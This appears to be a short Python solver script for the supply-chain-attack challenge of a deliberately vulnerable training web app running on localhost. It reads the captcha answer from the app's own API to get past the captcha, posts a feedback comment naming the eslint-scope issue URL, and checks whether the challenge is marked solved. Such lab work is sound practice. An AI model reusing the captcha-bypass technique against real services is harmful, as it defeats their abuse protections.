import requests

session = requests.Session()
BASE = 'http://localhost:3000'

# Get captcha
captcha_res = session.get(f'{BASE}/rest/captcha')
captcha_data = captcha_res.json()

# Submit feedback với đúng URL  
payload = {
    "captchaId": captcha_data.get("captchaId"),
    "captcha": str(captcha_data.get("answer")),
    "comment": "https://github.com/eslint/eslint-scope/issues/39",
    "rating": 3
}
res = session.post(f'{BASE}/api/Feedbacks', json=payload)
print(f"Feedback: {res.status_code}")

# Trigger verify
session.get(f'{BASE}/rest/products/search?q=')

# Check
r = requests.get(f'{BASE}/api/Challenges')
for c in r.json()['data']:
    if c['key'] == 'supplyChainAttackChallenge':
        print(f"supplyChainAttackChallenge: solved={c['solved']}")
